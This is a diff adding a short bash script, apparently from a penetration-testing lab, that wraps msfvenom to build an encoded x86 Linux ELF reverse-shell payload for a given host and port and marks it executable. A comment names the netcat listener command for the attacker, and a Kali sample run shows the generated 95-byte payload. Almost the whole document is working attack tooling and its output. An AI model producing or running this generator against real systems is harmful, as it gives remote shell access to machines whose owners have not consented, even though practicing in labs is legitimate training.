@@ -1,0 +1,28 @@
+#!/bin/bash
+# Takes host, port, and output filename runs it through msfvenom and chmods +x for an ELF file that calls a reverse netcat shell use: nc -lvp port on callback machine (attacker)
+if  [ $# -ne 3 ]; then
+        echo $0:  usage elfshell Host Port Name_of_ELF_file
+fi
+host="$1"
+port="$2"
+file="$3"
+var1="msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST="
+var2=" LPORT="
+var3=' -b "\x00"  -f elf -o '
+var=$var1$host$var2$port$var3$file
+echo $var
+/bin/sh -c "$var"
+/bin/sh -c "chmod +x $file"
+
+
+
+Running :
+
+root@kali:~/Downloads/labs/8# ./elf_shell.sh 127.0.0.1 4444 linux8
+msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f elf -o linux8
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Saved as: linux8
